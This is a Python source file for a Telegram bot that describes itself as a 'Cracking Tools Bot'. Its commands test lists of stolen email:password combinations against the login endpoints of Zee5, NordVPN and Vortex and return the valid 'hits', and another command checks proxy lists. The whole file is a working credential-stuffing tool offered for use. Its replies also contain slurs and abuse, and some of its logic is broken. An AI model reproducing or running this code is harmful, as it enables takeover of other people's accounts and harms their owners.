import os
import telethon
import requests
from telethon import TelegramClient, events, functions, Button
from telethon.tl.functions.users import GetFullUserRequest
from loggers import logging
from BotConfig import Config
from sql_s.broadcast_sql import add_usersid_in_db, already_added, get_all_users

bot = TelegramClient("bot", api_id=Config.API_ID, api_hash=Config.API_HASH)
UltraBot = bot.start(bot_token=Config.BOT_TOKEN)
sedpath = "./starkgangz/"
if not os.path.isdir(sedpath):
    os.makedirs(sedpath)

if not os.path.isdir(Config.DL_LOCATION):
    os.makedirs(Config.DL_LOCATION)

data = {
    "User-Agent": "NordApp android (playstore/2.8.6) Android 9.0.0",
    "Content-Length": "55",
    "Accept-Encoding": "gzip",
}

data2 = {"accept-encoding": "gzip", "user-agent": "RemotrAndroid/1.5.0"}


@UltraBot.on(events.NewMessage(pattern="^/proxy$"))
async def Devsexpo(event):
    if event.sender_id != Config.OWNER_ID:
        rip = await check_him(Config.JTU_ID, Config.JTU_LINK, event.sender_id)
        if rip is False:
            await event.reply(
                "**To Use This Bot, Please Join My Channel. :)**",
                buttons=[Button.url("Join Channel", Config.JTU_LINK)],
            )
            return
    ok = await event.reply(
        "CHECKING PROXIES... PLEASE WAIT. MAY TAKE TIME DEPENDING ON NUMBER OF PROXIES."
    )
    pablo = await event.get_reply_message()
    if not pablo.media:
        await event.reply('Reply To File')
        return
    escobar = await UltraBot.download_media(pablo.media, Config.DL_LOCATION)
    cmd = f"python3 -m PyProxyToolkit.Console -i {escobar} -o goood.txt -t 80 -x 20 -s httpbinStrategy"
    os.system(cmd)
    file = open("goood.txt", "r")
    Counter = 0
    Content = file.read()
    CoList = Content.split("\n")
    for i in CoList:
        if i:
            Counter += 1
    file.close()
    if Counter <= 0:
        await ok.edit(
            "Check Failed. Either Your File Has All Bad Proxies Or Your Proxy File Is Invalid."
        )
    elif Counter >= 1:
        file1 = open("goood.txt", "a")
        file1.write("\nCHECKED BY UltraBot. GET YOUR OWN UltraBot FROM @DevsExpo. \n")
        file1.close()
        ok.delete()
        await UltraBot.send_file(
            event.chat_id,
            "goood.txt",
            caption=f"**PROXIES CHECKED**\n**GOOD PROXIES: ** {Counter}\n\n**CHECKED BY UltraBot. GET YOUR OWN UltraBot FROM @DevsExpo.**",
        )
        os.remove(escobar)
        os.remove("goood.txt")


@UltraBot.on(events.NewMessage(pattern="^/zee5 ?(.*)"))
async def Devsexpo(event):
    if event.sender_id != Config.OWNER_ID:
        rip = await check_him(Config.JTU_ID, Config.JTU_LINK, event.sender_id)
        if rip is False:
            await event.reply(
                "**To Use This Bot, Please Join My Channel. :)**",
                buttons=[Button.url("Join Channel", Config.JTU_LINK)],
            )
            return
    input_str = event.pattern_match.group(1)
    if input_str == "combo":
        ok = await event.reply(
            "`Checking Your Combos File. This May Take Time Depending On No of Combos.`"
        )
        stark_dict = []
        hits_dict = []
        hits = 0
        bads = 0
        lol = await event.get_reply_message()
        if not lol.media:
            await ok.edit('Reply To File')
            return
        starky = await UltraBot.download_media(lol.media, Config.DL_LOCATION)
        file = open(starky, "r")
        lines = file.readlines()
        if len(lines) > 20:
            await ok.edit("`Woah, Thats A Lot Of Combos. Keep 20 As Limit`")
            return
        for line in lines:
            stark_dict.append(line)
        os.remove(starky)
        for i in stark_dict:
            starkm = i.split(":")
            email = starkm[0]
            password = starkm[1]
            try:
                meke = requests.get(
                    f"https://userapi.zee5.com/v1/user/loginemail?email={email}&password={password}"
                ).json()
            except BaseException:
                meke = None
            if meke.get("token"):
                hits += 1
                hits_dict.append(f"{email}:{password}")
            else:
                bads += 1
        if len(hits_dict) == 0:
            await ok.edit("**0 Hits. Probably, You Should Find Better Combos. LoL**")
            return
        with open("hits.txt", "w") as hitfile:
            for s in hits_dict:
                hitfile.write(s + " | @DevsExpo")
        ok.delete()
        await UltraBot.send_file(
            event.chat_id,
            "hits.txt",
            caption=f"**!ZEE5 HITS!** \n**HITS :** `{hits}` \n**BAD :** `{bads}`",
        )
        os.remove("hits.txt")
    else:
        if input_str:
            if ":" in input_str:
                stark = input_str.split(":", 1)
            else:
                await event.reply("**! No Lol, use email:pass Regex !**")
                return
        else:
            await event.reply("**Give Combos To Check**")
            return
        email = stark[0]
        password = stark[1]
        meke = requests.get(
            f"https://userapi.zee5.com/v1/user/loginemail?email={email}&password={password}"
        ).json()
        beautifuln = f"""
💖 **Checked Zee5 Account**
**Combo:** {email}:{password}
**Email:** {email}
**Password:-** {password}
**Response:-** This Account Is valid. 😀

🔱 **Checked By:-** {event.sender_id}

**✅Better Luck Next Time, Thanks For Using Me. 
Bot Made By @DevsExpo**"""

        beautiful = f"""
💖 **Checked Zee5 Account**
**Combo:** {email}:{password}
**Email:** {email}
**Password:-** {password}
**Response:-** This Account Is Invalid.😔

🔱 **Checked By:-** {event.sender_id}

**✅Better Luck Next Time, Thanks For Using Me. 
Bot Made By @DevsExpo**"""
        if meke.get("token"):
            await event.reply(beautiful)
        else:
            await event.reply(beautifuln)


@UltraBot.on(events.NewMessage(pattern="^/nord ?(.*)"))
async def Devsexpo(event):
    if event.sender_id != Config.OWNER_ID:
        rip = await check_him(Config.JTU_ID, Config.JTU_LINK, event.sender_id)
        if rip is False:
            await event.reply(
                "**To Use This Bot, Please Join My Channel. :)**",
                buttons=[Button.url("Join Channel", Config.JTU_LINK)],
            )
            return
    input_str = event.pattern_match.group(1)
    if input_str == "combo":
        ok = await event.reply(
            "`Checking Your Combos File. This May Take Time Depending On No of Combos.`"
        )
        stark_dict = []
        hits_dict = []
        hits = 0
        bads = 0
        lol = await event.get_reply_message()
        if not lol.media:
            await event.reply('Reply To File')
            return
        starky = await UltraBot.download_media(lol.media, Config.DL_LOCATION)
        file = open(starky, "r")
        lines = file.readlines()
        if len(lines) > 20:
            await ok.edit("`Woah, Thats A Lot Of Combos. Keep 20 As Limit`")
            return
        for line in lines:
            stark_dict.append(line)
        os.remove(starky)
        for i in stark_dict:
            starkm = i.split(":")
            email = starkm[0]
            password = starkm[1]
            sedlyf = {"username": email, "password": password}
            try:
                meke = requests.post(
                    url="https://zwyr157wwiu6eior.com/v1/users/tokens",
                    headers=data,
                    json=sedlyf,
                ).json()
            except BaseException:
                meke = None
            if meke.get("token"):
                hits += 1
                hits_dict.append(f"{email}:{password}")
            else:
                bads += 1
        if len(hits_dict) == 0:
            await ok.edit("**0 Hits. Probably, You Should Find Better Combos. LoL**")
            return
        with open("hits.txt", "w") as hitfile:
            for s in hits_dict:
                hitfile.write(s + " | @DevsExpo")
        ok.delete()
        await UltraBot.send_file(
            event.chat_id,
            "hits.txt",
            caption=f"**!NORD HITS!** \n**HITS :** `{hits}` \n**BAD :** `{bads}`",
        )
        os.remove("hits.txt")
    else:
        if input_str:
            if ":" in input_str:
                stark = input_str.split(":", 1)
            else:
                await event.reply("**! No Lol, use email:pass Regex !**")
                return
        else:
            await event.reply("**Give Combos To Check**")
            return
        email = stark[0]
        password = stark[1]
        sedlyf = {"username": email, "password": password}
        meke = requests.post(
            url="https://zwyr157wwiu6eior.com/v1/users/tokens",
            headers=data,
            json=sedlyf,
        ).json()
        beautifuln = f"""
💖 **Checked Nord Account**
**Combo:** {email}:{password}
**Email:** {email}
**Password:-** {password}
**Response:-** This Account Is valid. 😀

**✅Better Luck Next Time, Thanks For Using Me. 
Bot Made By @DevsExpo**"""

        beautiful = f"""
💖 **Checked Nord Account**
**Combo:** {email}:{password}
**Email:** {email}
**Password:-** {password}
**Response:-** This Account Is Invalid.😔

**✅Better Luck Next Time, Thanks For Using Me. 
Bot Made By @DevsExpo**"""
        if meke.get("token"):
            await event.reply(beautiful)
        else:
            await event.reply(beautifuln)


@UltraBot.on(events.NewMessage(pattern="^/vortex ?(.*)"))
async def Devsexpo(event):
    if event.sender_id != Config.OWNER_ID:
        rip = await check_him(Config.JTU_ID, Config.JTU_LINK, event.sender_id)
        if rip is False:
            await event.reply(
                "**To Use This Bot, Please Join My Channel. :)**",
                buttons=[Button.url("Join Channel", Config.JTU_LINK)],
            )
            return
    input_str = event.pattern_match.group(1)
    if input_str == "combo":
        ok = await event.reply(
            "`Checking Your Combos File. This May Take Time Depending On No of Combos.`"
        )
        stark_dict = []
        hits_dict = []
        hits = 0
        bads = 0
        lol = await event.get_reply_message()
        if not lol.media:
            await event.reply('Reply To File')
            return
        starky = await UltraBot.download_media(lol.media, Config.DL_LOCATION)
        file = open(starky, "r")
        lines = file.readlines()
        if len(lines) > 20:
            await ok.edit("`Woah, Thats A Lot Of Combos. Keep 20 As Limit`")
            return
        for line in lines:
            stark_dict.append(line)
        os.remove(starky)
        for i in stark_dict:
            starkm = i.split(":")
            email = starkm[0]
            password = starkm[1]
            sedlyf = {"username": email, "password": password}
            try:
                meke = requests.post(
                    url="https://vortex-api.gg/login", headers=data2, json=sedlyf
                ).json()
            except BaseException:
                meke = None
            if meke.get("token"):
                hits += 1
                hits_dict.append(f"{email}:{password}")
            else:
                bads += 1
        if len(hits_dict) == 0:
            await ok.edit("**0 Hits. Probably, You Should Find Better Combos. LoL**")
            return
        with open("hits.txt", "w") as hitfile:
            for s in hits_dict:
                hitfile.write(s + " | @DevsExpo")
        ok.delete()
        await UltraBot.send_file(
            event.chat_id,
            "hits.txt",
            caption=f"**!VORTEX HITS!** \n**HITS :** `{hits}` \n**BAD :** `{bads}`",
        )
        os.remove("hits.txt")
    else:
        if input_str:
            if ":" in input_str:
                stark = input_str.split(":", 1)
            else:
                await event.reply("**! No Lol, use email:pass Regex !**")
                return
        else:
            await event.reply("**Give Combos To Check**")
            return
        email = stark[0]
        password = stark[1]
        sedlyf = {"username": email, "password": password}
        meke = requests.post(
            url="https://vortex-api.gg/login", headers=data2, json=sedlyf
        ).json()
        beautifuln = f"""
💖 **Checked Vortex Account**
**Combo:** {email}:{password}
**Email:** {email}
**Password:-** {password}
**Response:-** This Account Is valid. 😀

**✅Better Luck Next Time, Thanks For Using Me. 
Bot Made By @DevsExpo**"""

        beautiful = f"""
💖 **Checked Vortex Account**
**Combo:** {email}:{password}
**Email:** {email}
**Password:-** {password}
**Response:-** This Account Is Invalid.😔

**✅Better Luck Next Time, Thanks For Using Me. 
Bot Made By @DevsExpo**"""
        if meke.get("token"):
            await event.reply(beautiful)
        else:
            await event.reply(beautifuln)


@UltraBot.on(events.NewMessage(func=lambda e: e.is_private))
async def real_nigga(event):
    if already_added(event.sender_id):
        pass
    elif not already_added(event.sender_id):
        add_usersid_in_db(event.sender_id)
        await UltraBot.send_message(
            Config.LOG_CHAT, f"**New User :** `{event.sender_id}`"
        )


@UltraBot.on(events.ChatAction())
async def _(event):
    if event.chat_id == Config.LOG_CHAT:
        return
    okbruh = await UltraBot.get_me()
    if event.user_joined or event.user_added == str(okbruh):
        lol = event.chat_id
        if already_added(event.chat_id):
            pass
        elif not already_added(event.chat_id):
            add_usersid_in_db(event.chat_id)
            await UltraBot.send_message(Config.LOG_CHAT, f"**New ChatGroup :** `{lol}`")

@UltraBot.on(events.NewMessage(pattern="^/start ?(.*)"))
async def atomz(event):
    replied_user = await UltraBot(GetFullUserRequest(event.sender_id))
    firstname = replied_user.user.first_name
    await event.reply(f'**Hai, {firstname} !, I Am Simple Cracking Tools Bot. PLease Use /help To See Cmds ! \nBy @DevsExpo**')
    
@UltraBot.on(events.NewMessage(pattern="^/leave ?(.*)"))
async def bye(event):
    if event.sender_id != Config.OWNER_ID:
        await event.reply('`Who is This Gey Commanding Me To Leave :/`')
        return
    okbruh = await UltraBot.get_me()
    await event.reply('Time To leave :(')
    await UltraBot.kick_participant(event.chat_id, okbruh.id)
                
@UltraBot.on(events.NewMessage(pattern="^/help ?(.*)"))
async def no_help(event):
    replied_user = await UltraBot(GetFullUserRequest(event.sender_id))
    firstname = replied_user.user.first_name
    lol_br = """
- /start - start me 
- /help - ??
- /zee5 <email:password> - Checks One Account
- /zee5 combo - Reply To Combos File And Limit is 20.
- /nord <email:password> - Checks One Account
- /nord combo - Reply To Combos File And Limit is 20.
- /vortex <email:password> - Checks One Account
- /vortex combo - Reply To Combos File And Limit is 20.
- /proxy - Reply To Proxy File Only, Check Your Proxies
BY @DevsExpo
    """
    await event.reply(f'**Hai, {firstname} !, Here is List Of Cmds \n{lol_br}**')
                
@UltraBot.on(events.NewMessage(pattern="^/broadcast ?(.*)"))
async def atomz(event):
    error_count = 0
    msgtobroadcast = event.pattern_match.group(1)
    if event.sender_id != Config.OWNER_ID:
        event.reply("**Fuck OFF Bitch !**")
        return
    hmm = get_all_users()
    for starkcast in hmm:
        try:
            await UltraBot.send_message(int(starkcast.chat_id), msgtobroadcast)
        except BaseException:
            error_count += 1
    sent_count = error_count - len(hmm)
    await UltraBot.send_message(
        event.chat_id,
        f"Broadcast Done in {sent_count} Group/Users and I got {error_count} Error and Total Number Was {len(userstobc)}",
    )


async def check_him(chnnl_id, chnnl_link, starkuser):
    if not Config.JTU_ENABLE:
        return True
    try:
        result = await UltraBot(
            functions.channels.GetParticipantRequest(
                channel=chnnl_id, user_id=starkuser
            )
        )
        return True
    except telethon.errors.rpcerrorlist.UserNotParticipantError:
        return False


print("Bot Is Alive.")


def startbot():
    UltraBot.run_until_disconnected()


if __name__ == "__main__":
    startbot()
